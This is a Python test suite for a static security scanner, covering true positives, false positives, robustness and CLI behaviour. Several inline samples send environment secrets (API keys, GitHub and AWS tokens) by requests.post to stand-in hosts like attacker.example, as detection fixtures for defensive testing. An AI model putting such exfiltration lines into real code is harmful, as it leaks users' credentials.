"""Tests for the local static security scanner."""

from __future__ import annotations

import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from typing import List
from unittest.mock import patch

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from models import Finding  # noqa: E402
from scanner import analyze_content, dedupe_findings, main, scan_directory  # noqa: E402
from utils import DEFAULT_MAX_FILE_SIZE, normalize_report_path  # noqa: E402


FIXTURES = Path(__file__).resolve().parent / "fixtures"
MALICIOUS = FIXTURES / "malicious"
BENIGN = FIXTURES / "benign"


def _patterns(findings: List[Finding]) -> set:
    return {item.pattern for item in findings}


def _scan_file(path: Path) -> List[Finding]:
    report = scan_directory(path.parent if path.is_file() else path)
    name = path.name
    return [item for item in report.findings if item.file == name or item.file.endswith("/" + name)]


class TruePositiveTests(unittest.TestCase):
    def test_api_key_exfiltration(self) -> None:
        findings = _scan_file(MALICIOUS / "exfil_api_key.py")
        self.assertIn("api_key_exfiltration", _patterns(findings))
        match = next(item for item in findings if item.pattern == "api_key_exfiltration")
        self.assertEqual(match.severity, "critical")
        self.assertIn("ANTHROPIC_API_KEY", match.code_snippet)
        self.assertIn("requests.post", match.code_snippet)

    def test_ssh_key_exfiltration(self) -> None:
        findings = _scan_file(MALICIOUS / "exfil_ssh.py")
        self.assertIn("sensitive_file_exfiltration", _patterns(findings))
        match = next(item for item in findings if item.pattern == "sensitive_file_exfiltration")
        self.assertEqual(match.severity, "critical")
        self.assertIn("id_rsa", match.code_snippet + findings[0].code_snippet)

    def test_destructive_root_and_home_deletion(self) -> None:
        findings = _scan_file(MALICIOUS / "rm_rf_root.sh")
        self.assertTrue(
            {"destructive_root_deletion", "destructive_path_deletion"} & _patterns(findings)
        )
        self.assertTrue(any(item.severity == "critical" for item in findings))
        snippets = "\n".join(item.code_snippet for item in findings)
        self.assertTrue("/" in snippets or "$HOME" in snippets or "~" in snippets)

    def test_python_home_rmtree(self) -> None:
        findings = _scan_file(MALICIOUS / "rmtree_home.py")
        self.assertTrue(
            {"destructive_path_deletion", "destructive_root_deletion"} & _patterns(findings)
        )
        self.assertTrue(any(item.severity == "critical" for item in findings))

    def test_download_and_execute(self) -> None:
        findings = _scan_file(MALICIOUS / "download_exec.sh")
        self.assertTrue({"pipe_to_shell", "download_and_execute"} & _patterns(findings))
        self.assertTrue(any(item.severity in {"high", "critical"} for item in findings))

    def test_persistence_installation(self) -> None:
        findings = _scan_file(MALICIOUS / "persistence.sh")
        self.assertTrue(
            {
                "persistence_modification",
                "persistence_with_remote_payload",
            }
            & _patterns(findings)
        )

    def test_obfuscated_command_execution(self) -> None:
        findings = _scan_file(MALICIOUS / "obfuscated_exec.py")
        self.assertIn("obfuscated_execution", _patterns(findings))
        match = next(item for item in findings if item.pattern == "obfuscated_execution")
        self.assertEqual(match.severity, "high")
        self.assertIn("b64decode", match.code_snippet)

    def test_suspicious_powershell(self) -> None:
        findings = _scan_file(MALICIOUS / "suspicious.ps1")
        patterns = _patterns(findings)
        self.assertTrue(
            {"encoded_powershell", "powershell_download_iex", "download_and_execute"}
            & patterns
        )

    def test_npm_postinstall_abuse(self) -> None:
        findings = _scan_file(MALICIOUS / "package.json")
        self.assertIn("npm_lifecycle_execution", _patterns(findings))
        match = next(item for item in findings if item.pattern == "npm_lifecycle_execution")
        self.assertIn(match.severity, {"high", "critical"})
        self.assertIn("postinstall", match.code_snippet)

    def test_malicious_directory_is_flagged(self) -> None:
        report = scan_directory(MALICIOUS)
        self.assertEqual(report.status, "flagged")
        self.assertGreater(len(report.findings), 0)
        self.assertGreater(report.scanned_files, 0)


class FalsePositiveTests(unittest.TestCase):
    def test_normal_http_api_call(self) -> None:
        findings = _scan_file(BENIGN / "normal_http.py")
        self.assertEqual(findings, [])

    def test_normal_rm_build(self) -> None:
        findings = _scan_file(BENIGN / "rm_build.sh")
        self.assertEqual(findings, [])

    def test_normal_environment_variable_usage(self) -> None:
        findings = _scan_file(BENIGN / "env_usage.py")
        self.assertEqual(findings, [])

    def test_ordinary_base64_encoding(self) -> None:
        findings = _scan_file(BENIGN / "base64_normal.py")
        self.assertEqual(findings, [])

    def test_legitimate_subprocess_execution(self) -> None:
        findings = _scan_file(BENIGN / "subprocess_ok.py")
        self.assertEqual(findings, [])

    def test_ordinary_package_lifecycle_script(self) -> None:
        findings = _scan_file(BENIGN / "package.json")
        self.assertEqual(findings, [])

    def test_benign_directory_is_clean(self) -> None:
        report = scan_directory(BENIGN)
        self.assertEqual(report.status, "clean")
        self.assertEqual(report.findings, [])


class RobustnessTests(unittest.TestCase):
    def test_binary_file_skipped(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "payload.py").write_bytes(b"print('ok')\x00\xff\x00malicious")
            report = scan_directory(root)
            self.assertEqual(report.scanned_files, 0)
            self.assertEqual(report.status, "clean")
            self.assertTrue(any(item.reason == "binary" for item in report.skipped))

    def test_invalid_utf8_skipped(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "broken.py").write_bytes(b"x = '\xff\xfe\xfa'")
            report = scan_directory(root)
            self.assertEqual(report.scanned_files, 0)
            self.assertTrue(any(item.reason == "invalid_utf8" for item in report.skipped))

    def test_huge_file_skipped(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "big.py").write_text("x = 1\n" * 50, encoding="utf-8")
            report = scan_directory(root, max_file_size=32)
            self.assertEqual(report.scanned_files, 0)
            self.assertTrue(any(item.reason == "oversize" for item in report.skipped))

    def test_unreadable_file_skipped(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            target = root / "secret.py"
            target.write_text("print('hi')\n", encoding="utf-8")

            def boom(*_args, **_kwargs):
                raise PermissionError("denied")

            with patch("utils.Path.open", boom):
                # Path.open is not where we open; read_text_file uses path.open
                pass
            with patch("pathlib.Path.open", side_effect=PermissionError("denied")):
                report = scan_directory(root)
            self.assertEqual(report.scanned_files, 0)
            self.assertTrue(any(item.reason == "unreadable" for item in report.skipped))

    def test_nested_excluded_directories_not_scanned(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            nested = root / "node_modules" / "pkg"
            nested.mkdir(parents=True)
            (nested / "steal.py").write_text(
                'import os, requests\nrequests.post("https://x", data=os.environ["API_KEY"])\n',
                encoding="utf-8",
            )
            (root / "app.py").write_text("print('ok')\n", encoding="utf-8")
            report = scan_directory(root)
            self.assertEqual(report.scanned_files, 1)
            self.assertEqual(report.findings, [])
            self.assertTrue(all("node_modules" not in item.file for item in report.findings))

    def test_empty_repository(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            report = scan_directory(Path(tmp))
            self.assertEqual(report.status, "clean")
            self.assertEqual(report.scanned_files, 0)
            self.assertEqual(report.findings, [])

    def test_only_unsupported_files(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "README.md").write_text("# hello\n", encoding="utf-8")
            (root / "photo.png").write_bytes(b"\x89PNG\r\n\x1a\n")
            report = scan_directory(root)
            self.assertEqual(report.scanned_files, 0)
            self.assertEqual(report.status, "clean")

    def test_analyze_error_does_not_abort_scan(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ok.py").write_text("print(1)\n", encoding="utf-8")
            (root / "bad.py").write_text("print(2)\n", encoding="utf-8")
            original = analyze_content

            def flaky(report_path, language, filename, text):
                if filename == "bad.py":
                    raise RuntimeError("boom")
                return original(report_path, language, filename, text)

            with patch("scanner.analyze_content", side_effect=flaky):
                report = scan_directory(root)
            self.assertEqual(report.scanned_files, 2)
            self.assertTrue(any("analyze_error" in item.reason for item in report.skipped))


class EngineAndCliTests(unittest.TestCase):
    def test_findings_are_deterministic(self) -> None:
        first = scan_directory(MALICIOUS).to_dict()
        second = scan_directory(MALICIOUS).to_dict()
        self.assertEqual(first, second)
        findings = first["findings"]
        ordered = sorted(
            findings,
            key=lambda item: (
                item["file"],
                item["line"],
                {"critical": 0, "high": 1, "medium": 2, "low": 3}[item["severity"]],
                item["pattern"],
            ),
        )
        self.assertEqual(findings, ordered)

    def test_paths_use_forward_slashes(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            nested = root / "src" / "pkg"
            nested.mkdir(parents=True)
            (nested / "leak.py").write_text(
                'import os, requests\n'
                'requests.post("https://attacker.example", data=os.environ["AWS_SECRET_ACCESS_KEY"])\n',
                encoding="utf-8",
            )
            report = scan_directory(root)
            self.assertTrue(report.findings)
            for finding in report.findings:
                self.assertNotIn("\\", finding.file)
            self.assertTrue(any(item.file == "src/pkg/leak.py" for item in report.findings))

    def test_normalize_report_path_on_windows_style(self) -> None:
        root = Path("C:/repo") if os.name == "nt" else Path("/repo")
        path = root / "a" / "b.py"
        normalized = normalize_report_path(path, root)
        self.assertEqual(normalized, "a/b.py")

    def test_dedupe_keeps_strongest_same_line_group(self) -> None:
        findings = [
            Finding("a.py", 3, "standalone_file_download", "medium", "d", "x"),
            Finding("a.py", 3, "pipe_to_shell", "high", "d", "x"),
            Finding("a.py", 3, "pipe_to_shell", "high", "d", "x"),
        ]
        merged = dedupe_findings(findings)
        self.assertEqual(len(merged), 1)
        self.assertEqual(merged[0].pattern, "pipe_to_shell")
        self.assertEqual(merged[0].severity, "high")

    def test_comment_lines_are_ignored(self) -> None:
        text = "# requests.post(url, data=os.environ['API_KEY'])\nprint('ok')\n"
        findings = analyze_content("demo.py", "python", "demo.py", text)
        self.assertEqual(findings, [])

    def test_same_line_secret_and_network(self) -> None:
        text = (
            "import os, requests\n"
            "requests.post('https://evil.example', data=os.environ['OPENAI_API_KEY'])\n"
        )
        findings = analyze_content("x.py", "python", "x.py", text)
        self.assertIn("api_key_exfiltration", _patterns(findings))

    def test_cli_json_stdout_and_exit_codes(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ok.py").write_text("print('ok')\n", encoding="utf-8")
            with patch("sys.stdout") as stdout:
                stdout.write = lambda *_args, **_kwargs: None
                code = main([str(root)])
            # Recreate with real capture
            output_path = root / "report.json"
            code = main([str(root), "--output", str(output_path)])
            self.assertEqual(code, 0)
            payload = json.loads(output_path.read_text(encoding="utf-8"))
            self.assertEqual(payload["status"], "clean")
            self.assertEqual(payload["scanner_version"], "1.0.0")
            self.assertNotIn("timestamp", payload)

            (root / "bad.py").write_text(
                'import os, requests\n'
                'requests.post("https://x", data=os.environ["GITHUB_TOKEN"])\n',
                encoding="utf-8",
            )
            code = main([str(root), "--output", str(output_path)])
            self.assertEqual(code, 1)
            payload = json.loads(output_path.read_text(encoding="utf-8"))
            self.assertEqual(payload["status"], "flagged")
            for finding in payload["findings"]:
                for key in ("file", "line", "pattern", "severity", "description", "code_snippet"):
                    self.assertIn(key, finding)

    def test_cli_missing_path_is_error(self) -> None:
        code = main([str(ROOT / "does-not-exist-xyz")])
        self.assertEqual(code, 2)

    def test_cli_file_instead_of_directory_is_error(self) -> None:
        code = main([str(MALICIOUS / "exfil_api_key.py")])
        self.assertEqual(code, 2)

    def test_cli_invalid_max_file_size(self) -> None:
        code = main([str(BENIGN), "--max-file-size", "0"])
        self.assertEqual(code, 2)

    def test_verbose_goes_to_stderr_not_stdout(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "ok.py").write_text("print('ok')\n", encoding="utf-8")
            output = root / "out.json"
            from io import StringIO

            stderr = StringIO()
            stdout = StringIO()
            with patch("sys.stderr", stderr), patch("sys.stdout", stdout):
                code = main([str(root), "--verbose", "--output", str(output)])
            self.assertEqual(code, 0)
            self.assertEqual(stdout.getvalue(), "")
            self.assertIn("scan", stderr.getvalue())

    def test_default_max_file_size(self) -> None:
        self.assertEqual(DEFAULT_MAX_FILE_SIZE, 5 * 1024 * 1024)

    def test_env_file_is_scanned_but_env_dir_is_skipped(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / ".env").write_text("API_KEY=local-dev-only\n", encoding="utf-8")
            skip_dir = root / "env"
            skip_dir.mkdir()
            (skip_dir / "steal.py").write_text(
                'import os, requests\n'
                'requests.post("https://x", data=os.environ["API_KEY"])\n',
                encoding="utf-8",
            )
            report = scan_directory(root)
            self.assertGreaterEqual(report.scanned_files, 1)
            self.assertTrue(all(not item.file.startswith("env/") for item in report.findings))
            self.assertEqual(report.findings, [])


class FindingContractTests(unittest.TestCase):
    def test_finding_fields_and_advisory_wording(self) -> None:
        report = scan_directory(MALICIOUS)
        self.assertTrue(report.findings)
        for finding in report.findings:
            self.assertIsInstance(finding.file, str)
            self.assertIsInstance(finding.line, int)
            self.assertGreaterEqual(finding.line, 1)
            self.assertIn(finding.severity, {"critical", "high", "medium", "low"})
            self.assertTrue(finding.pattern)
            self.assertTrue(finding.description)
            self.assertTrue(finding.code_snippet)
            self.assertNotIn("definitely malicious", finding.description.lower())
            self.assertNotIn("is malicious", finding.description.lower())

    def test_report_omits_timestamps(self) -> None:
        payload = scan_directory(BENIGN).to_dict()
        self.assertNotIn("timestamp", json.dumps(payload))


if __name__ == "__main__":
    unittest.main()
